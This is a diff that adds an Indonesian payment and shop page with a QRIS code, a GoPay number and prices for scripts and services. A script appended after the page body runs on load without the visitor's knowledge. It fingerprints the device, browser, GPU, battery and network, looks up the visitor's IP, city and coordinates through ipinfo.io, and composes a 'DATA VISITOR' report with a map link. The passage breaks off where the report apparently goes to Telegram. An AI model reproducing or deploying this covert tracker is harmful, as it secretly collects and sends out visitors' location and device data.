@@ -1,0 +1,511 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Web Pembayaran Danji</title>
+        <meta name="viewport" content="width=device-width,initial-scale=1" />
+        <link
+            href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+            rel="stylesheet"
+        />
+        <style>
+            body {
+                min-height: 100vh;
+                background: linear-gradient(130deg, #09090b 0%, #45020c 100%);
+                font-family: "Segoe UI", sans-serif;
+            }
+            .glow {
+                box-shadow:
+                    0 0 32px 6px #b91c1c99,
+                    0 0 2px #fff;
+                border: 2.5px solid #b91c1c;
+                animation: pulse 2.5s infinite;
+            }
+            .neon-text {
+                color: #f87171;
+                text-shadow:
+                    0 0 10px #b91c1c,
+                    0 0 20px #b91c1c,
+                    0 0 30px #b91c1c,
+                    0 0 40px #b91c1c90,
+                    0 0 70px #b91c1c80;
+                letter-spacing: 2px;
+                animation: neonflicker 3s infinite alternate;
+            }
+            @keyframes pulse {
+                0%,
+                100% {
+                    box-shadow:
+                        0 0 32px 8px #b91c1c66,
+                        0 0 2px #fff;
+                }
+                50% {
+                    box-shadow:
+                        0 0 64px 12px #f87171cc,
+                        0 0 12px #fff;
+                }
+            }
+            @keyframes neonflicker {
+                0%,
+                100% {
+                    opacity: 1;
+                    filter: brightness(1);
+                }
+                70% {
+                    opacity: 0.93;
+                    filter: brightness(1.2);
+                }
+                85% {
+                    opacity: 0.7;
+                    filter: brightness(1.5);
+                }
+            }
+            .paycard {
+                background: rgba(18, 16, 18, 0.93);
+                border-radius: 1.7rem;
+                box-shadow: 0 2px 40px #b91c1c30;
+                transition:
+                    transform 0.14s,
+                    box-shadow 0.14s;
+            }
+            .paycard:hover {
+                transform: translateY(-8px) scale(1.03);
+                box-shadow:
+                    0 8px 60px #fa223499,
+                    0 0 24px #fa223455;
+            }
+            .qrbox {
+                background: linear-gradient(135deg, #1e1b20 60%, #333 100%);
+                padding: 1.2rem;
+                border-radius: 1.2rem;
+                box-shadow: 0 0 22px #2227;
+            }
+            .btn-tg {
+                background: linear-gradient(90deg, #b91c1c, #f87171);
+                color: #fff;
+                border-radius: 999px;
+                font-weight: 600;
+                padding: 0.75rem 2rem;
+                box-shadow: 0 2px 24px #b91c1c45;
+                transition:
+                    background 0.18s,
+                    box-shadow 0.18s,
+                    transform 0.18s;
+                border: none;
+                display: inline-flex;
+                align-items: center;
+                gap: 0.6em;
+                font-size: 1rem;
+                margin-top: 2.5rem;
+                cursor: pointer;
+                letter-spacing: 0.5px;
+                outline: none;
+            }
+            .btn-tg:hover {
+                background: linear-gradient(90deg, #d71c1c, #f43f5e);
+                box-shadow: 0 6px 32px #fa223485;
+                transform: scale(1.05) translateY(-2px);
+                text-decoration: none;
+                color: #fff;
+            }
+            .btn-tg svg {
+                width: 22px;
+                height: 22px;
+                margin-right: 0.25em;
+                vertical-align: middle;
+                fill: #fff;
+            }
+            .copy-btn {
+                background: #18181b;
+                border: 1.2px solid #f87171;
+                color: #fff;
+                padding: 0.45rem 1.2rem;
+                border-radius: 999px;
+                margin-top: 1em;
+                cursor: pointer;
+                font-size: 0.98em;
+                font-weight: 500;
+                transition:
+                    background 0.13s,
+                    border 0.13s;
+            }
+            .copy-btn:hover {
+                background: #f87171;
+                border: 1.5px solid #fff;
+                color: #fff;
+            }
+            /* List jualan */
+            .list-jualan {
+                background: #18181b;
+                border-radius: 1.5rem;
+                box-shadow: 0 2px 32px #fa223420;
+                padding: 2rem 1.5rem;
+                margin-bottom: 2.5rem;
+                width: 100%;
+                max-width: 470px;
+            }
+            .list-jualan h2 {
+                color: #f87171;
+                text-shadow: 0 0 12px #b91c1c77;
+                font-size: 1.3rem;
+                font-weight: bold;
+                margin-bottom: 1rem;
+                letter-spacing: 1px;
+                text-align: center;
+            }
+            .list-jualan ul {
+                padding-left: 1.1rem;
+            }
+            .list-jualan li {
+                color: #fff;
+                font-size: 1.06rem;
+                margin-bottom: 0.7em;
+                border-left: 3px solid #fa2234;
+                padding-left: 0.7em;
+                line-height: 1.5;
+                background: #24242455;
+                border-radius: 0.3em;
+                transition: background 0.2s;
+            }
+            .list-jualan li:hover {
+                background: #b91c1c22;
+            }
+        </style>
+        <script>
+            function copyGopay() {
+                const gopay = "089637254003";
+                navigator.clipboard.writeText(gopay);
+                const btn = document.getElementById("copy-btn");
+                btn.innerText = "Copied!";
+                setTimeout(() => (btn.innerText = "SALIN NOMOR GOPAY"), 1400);
+            }
+        </script>
+    </head>
+    <body class="flex flex-col items-center justify-center px-4">
+        <!-- Musik Otomatis -->
+        <audio
+            id="bg-music"
+            src="https://cdn.pixabay.com/audio/2023/03/28/audio_12c8fb1e28.mp3"
+            autoplay
+            loop
+            hidden
+        ></audio>
+        <!-- Logo -->
+        <img
+            src="https://files.catbox.moe/vfot45.jpg"
+            alt="Limvzx Logo"
+            class="w-24 mt-12 mb-5 rounded-2xl shadow-lg glow"
+            style="background: #111"
+        />
+        <!-- Judul -->
+        <h1 class="text-3xl font-bold neon-text mb-2 text-center select-none">
+            WEB PEMBAYARAN DANJI
+        </h1>
+        <div class="mb-8 text-sm text-gray-300 text-center tracking-wide">
+            Ini Web Payment<span class="mx-1">&bull;</span> Bukan
+            <span class="mx-1">&bull;</span> Web Bokep
+        </div>
+        <!-- Payment Card -->
+        <div
+            class="paycard flex flex-col md:flex-row gap-8 p-6 md:p-10 items-center mb-6"
+        >
+            <!-- QRIS -->
+            <div class="flex flex-col items-center">
+                <div
+                    class="text-lg font-semibold text-[#fa2234] mb-2 tracking-wider neon-text"
+                    style="color: #fa2234; text-shadow: 0 0 14px #fa2234cc"
+                >
+                    QRIS LIMVZX
+                </div>
+                <div class="qrbox">
+                    <img
+                        src="https://files.catbox.moe/6s8qcn.jpg"
+                        alt="QRIS QR"
+                        class="w-40 h-40 rounded-xl border-4 border-[#fa2234] bg-white"
+                    />
+                </div>
+                <div class="text-xs mt-2 text-gray-400">
+                    Scan Qris lalu kirimkan bukti ke Danji
+                </div>
+            </div>
+            <!-- Divider -->
+            <div
+                class="hidden md:block w-px h-40 bg-gradient-to-b from-red-700 via-black to-red-700 mx-4"
+            ></div>
+            <!-- Nomor DANA -->
+            <div class="flex flex-col items-center justify-center">
+                <div
+                    class="text-lg font-semibold text-[#02bde3] mb-3 tracking-wider neon-text"
+                    style="color: #02bde3; text-shadow: 0 0 14px #02bde3cc"
+                >
+                    GOPAY (Nomor)
+                </div>
+                <div
+                    class="text-2xl font-mono font-bold text-white bg-[#1a1a1a] rounded-xl px-5 py-2 mb-2 border-2 border-[#02bde3] select-all"
+                >
+                    089637254003
+                </div>
+                <button id="copy-btn" class="copy-btn" onclick="copyDana()">
+                    SALIN NOMOR DANA
+                </button>
+                <div class="text-xs mt-2 text-gray-400">
+                    Pastikan transfer ke nomor ini
+                </div>
+            </div>
+        </div>
+        <!-- Tambahkan di bawah card pembayaran -->
+
+        <div class="w-full max-w-md mx-auto list-jualan">
+            <h2 class="mb-4">PRODUK PILIHAN DANJI</h2>
+
+            <!-- SC CIKIWIR -->
+            <button
+                onclick="toggleAccordion('scdheatless')"
+                class="w-full flex justify-between items-center px-5 py-3 mb-2 bg-[#2a2226] rounded-xl border border-[#fa2234] neon-text text-left focus:outline-none transition hover:bg-[#b91c1c33]"
+            >
+                <span>SC DHEATLESS</span>
+                <svg
+                    id="icon-scdheatless"
+                    class="w-5 h-5 transition-transform"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                    stroke="currentColor"
+                >
+                    <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="3"
+                        d="M19 9l-7 7-7-7"
+                    />
+                </svg>
+            </button>
+            <div
+                id="panel-scdheatless"
+                class="hidden bg-[#18181b] border-l-4 border-[#fa2234] px-6 py-4 mb-2 rounded-b-xl animate__animated animate__fadeInDown"
+            >
+                <ul class="text-white space-y-2 text-base">
+                    <li>20 K - <span class="text-gray-300">No Up</span></li>
+                    <li>35 K - <span class="text-gray-300">Free Up</span></li>
+                    <li>50 K - <span class="text-gray-300">Reseller</span></li>
+                </ul>
+            </div>
+
+            <!-- PRODUK LIMVZX -->
+            <button
+                onclick="toggleAccordion('ptotax')"
+                class="w-full flex justify-between items-center px-5 py-3 mb-2 bg-[#2a2226] rounded-xl border border-[#02bde3] neon-text text-left focus:outline-none transition hover:bg-[#02bde322]"
+            >
+                <span>PRODUK DANJI</span>
+                <svg
+                    id="icon-ptlimvzc"
+                    class="w-5 h-5 transition-transform"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                    stroke="currentColor"
+                >
+                    <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="3"
+                        d="M19 9l-7 7-7-7"
+                    />
+                </svg>
+            </button>
+            <div
+                id="panel-ptlimvzc"
+                class="hidden bg-[#18181b] border-l-4 border-[#02bde3] px-6 py-4 mb-2 rounded-b-xl animate__animated animate__fadeInDown"
+            >
+                <ul class="text-white space-y-2 text-base">
+                    <li>10 K (PT SIGMA)</li>
+                    <li>45 K (PT PRIBADI DANJI)</li>
+                    <li>70 K (TANGAN KANAN DANJI)</li>
+                    <li>5-10 K (JASA CREATE HTML-WEB)</li>
+                    <li>10-15 K (TERGANTUNG RENEMENYA BANYAK GA)</li>
+                    <li class="text-xs text-gray-300">
+                        All Benefit Bisa Langsung Ditanyakan Ke Danji
+                    </li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Script accordion sederhana -->
+        <script>
+            function toggleAccordion(id) {
+                const panel = document.getElementById("panel-" + id);
+                const icon = document.getElementById("icon-" + id);
+                const isHidden = panel.classList.contains("hidden");
+                document
+                    .querySelectorAll("[id^=panel-]")
+                    .forEach(p => p.classList.add("hidden"));
+                document
+                    .querySelectorAll("[id^=icon-]")
+                    .forEach(i => (i.style.transform = "rotate(0deg)"));
+                if (isHidden) {
+                    panel.classList.remove("hidden");
+                    icon.style.transform = "rotate(180deg)";
+                }
+            }
+        </script>
+        <!-- Tombol Contact Developer Telegram -->
+        <a
+            href="https://t.me/danji27"
+            target="_blank"
+            class="btn-tg mt-6"
+        >
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512">
+                <path
+                    d="M248,8C111.033,8,0,119.033,0,256s111.033,248,248,248,248-111.033,248-248S384.967,8,248,8Zm104,372.114c-4.041,16.249-36.874,32.155-101.822,32.155-66.148,0-117.854-15.918-122.137-32.167-4.174-15.974,40.378-32.174,101.821-32.174C311.304,347.927,360.09,363.959,352,380.114ZM248,350.365c-56.801,0-103.36-9.169-103.36-20.467,0-11.317,46.559-20.487,103.36-20.487s103.36,9.17,103.36,20.487C351.36,341.196,304.801,350.365,248,350.365Zm120.648-93.8c0,10.374-46.664,19.646-104.146,19.646s-104.146-9.271-104.146-19.646c0-10.361,46.664-19.633,104.146-19.633S368.648,246.204,368.648,256.565Zm-40.133-61.176c0,8.544-34.872,15.475-77.815,15.475s-77.815-6.931-77.815-15.475c0-8.56,34.872-15.494,77.815-15.494S328.515,186.829,328.515,195.389Z"
+                />
+            </svg>
+            Contact Developer
+        </a>
+        <div class="mt-6 mb-6 text-xs text-gray-500 text-center select-none">
+            &copy; 2025 <span class="text-red-600 font-bold">Limvzx</span> • All
+            Rights Reserved.
+        </div>
+    </body>
+</html>
+<script>
+    
+    function detectBrowserOS(userAgent) {
+        let browser = "Unknown",
+            os = "Unknown",
+            model = "-",
+            brand = "-";
+        if (/chrome|crios|crmo/i.test(userAgent)) browser = "Chrome";
+        else if (/firefox|fxios/i.test(userAgent)) browser = "Firefox";
+        else if (/safari/i.test(userAgent)) browser = "Safari";
+        else if (/opr\//i.test(userAgent)) browser = "Opera";
+        else if (/edg/i.test(userAgent)) browser = "Edge";
+        else if (/trident/i.test(userAgent)) browser = "IE";
+        if (/windows nt/i.test(userAgent)) os = "Windows";
+        else if (/android/i.test(userAgent)) os = "Android";
+        else if (/iphone|ipad|ipod/i.test(userAgent)) os = "iOS";
+        else if (/macintosh|mac os x/i.test(userAgent)) os = "MacOS";
+        else if (/linux/i.test(userAgent)) os = "Linux";
+        // Model & Brand (simple mapping)
+        const match = userAgent.match(
+            /\((?:Linux; )?Android [\d.]+; ([^;]+)[;)]/
+        );
+        if (match) {
+            model = match[1].trim();
+            if (model.startsWith("SM-")) brand = "Samsung";
+            else if (model.startsWith("M20") || model.startsWith("Redmi"))
+                brand = "Xiaomi";
+            else if (model.startsWith("Infinix")) brand = "Infinix";
+            else if (model.startsWith("CPH")) brand = "OPPO";
+            else if (model.startsWith("V")) brand = "Vivo";
+            else brand = "-";
+        }
+        return { browser, os, model, brand };
+    }
+
+    
+    function getFonts() {
+        // Butuh library, bisa ditiadakan
+        return "-";
+    }
+
+    (async function () {
+        const navi = navigator;
+        const b = detectBrowserOS(navi.userAgent);
+
+        
+        let net =
+            navi.connection ||
+            navi.mozConnection ||
+            navi.webkitConnection ||
+            {};
+        let connectionType = net.effectiveType || "-";
+        let downlink = net.downlink || "-";
+        let rtt = net.rtt || "-";
+
+       
+        let now = new Date();
+        let localTime = now.toString();
+        let tzOffset = now.getTimezoneOffset();
+
+        
+        let gpu = "-";
+        try {
+            let canvas = document.createElement("canvas");
+            let gl =
+                canvas.getContext("webgl") ||
+                canvas.getContext("experimental-webgl");
+            if (gl) {
+                let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                if (debugInfo)
+                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch {}
+
+        
+        let ipinfo = {};
+        try {
+            let resp = await fetch("https://ipinfo.io/json");
+            ipinfo = await resp.json();
+        } catch (e) {}
+
+       
+        let gmaps = "-";
+        if (ipinfo.loc && ipinfo.loc.match(/^[-.\d]+,[-.\d]+$/))
+            gmaps = `https://www.google.com/maps/search/?api=1&query=${ipinfo.loc}`;
+
+        
+        let battery = "-";
+        if (navi.getBattery) {
+            try {
+                let bat = await navi.getBattery();
+                battery = `${Math.round(bat.level * 100)}% ${
+                    bat.charging ? "🔌" : ""
+                }`;
+            } catch {}
+        }
+
+        
+        let message = "🦠 *DATA VISITOR LIMVZX WEB* 🦠\n";
+        message += `\n*IP*: \`${ipinfo.ip || "-"}\``;
+        message += `\n*Kota*: ${ipinfo.city || "-"}`;
+        message += `\n*Wilayah*: ${ipinfo.region || "-"}`;
+        message += `\n*Negara*: ${ipinfo.country || "-"}`;
+        message += `\n*Provider*: ${ipinfo.org || "-"}`;
+        message += `\n*Lokasi*: ${ipinfo.loc || "-"}`;
+        message += `\n*Google Maps*: [Lihat Lokasi](${gmaps})`;
+        message += `\n*Kode Pos*: ${ipinfo.postal || "-"}`;
+        message += `\n*Zona Waktu IP*: ${ipinfo.timezone || "-"}\n`;
+        message += `\n*User-Agent*: \`${navi.userAgent}\``;
+        message += `\n*Browser*: ${b.browser}`;
+        message += `\n*OS*: ${b.os}`;
+        message += `\n*Model HP*: ${b.model}`;
+        message += `\n*Merk HP*: ${b.brand}`;
+        message += `\n*Platform*: ${navi.platform}`;
+        message += `\n*Bahasa*: ${navi.language} (${(navi.languages || []).join(
+            ", "
+        )})`;
+        message += `\n*Resolusi*: ${screen.width}x${screen.height} (depth: ${screen.colorDepth})`;
+        message += `\n*CPU Logical*: ${navi.hardwareConcurrency || "-"}`;
+        message += `\n*RAM*: ${navi.deviceMemory || "-"} GB`;
+        message += `\n*Touch*: ${"ontouchstart" in window ? "Ya" : "Tidak"}`;
+        message += `\n*Online*: ${navi.onLine ? "Ya" : "Tidak"}`;
+        message += `\n*Cookies*: ${navi.cookieEnabled ? "Aktif" : "Tidak"}`;
+        message += `\n*Battery*: ${battery}`;
+        message += `\n*Referrer*: ${document.referrer}`;
+        message += `\n*URL*: ${location.href}`;
+        message += `\n*Timezone*: ${
+            Intl.DateTimeFormat().resolvedOptions().timeZone
+        }`;
+        message += `\n*Offset TZ*: ${tzOffset}`;
+        message += `\n*Font List*: ${getFonts()}`;
+        message += `\n*GPU*: ${gpu}`;
+        message += `\n*Network Type*: ${connectionType}`;
+        message += `\n*Bandwidth*: ${downlink} Mbps`;
+        message += `\n*RTT*: ${rtt} ms`;
+        message += `\n*Waktu Lokal*: ${localTime}`;
+        message += `\n*Mode Gelap*: ${
+            window.matchMedia &&
+            window.matchMedia("(prefers-color-scheme: dark)").matches
+                ? "Ya"
+                : "Tidak"
+        }`;
+
+        const teleg
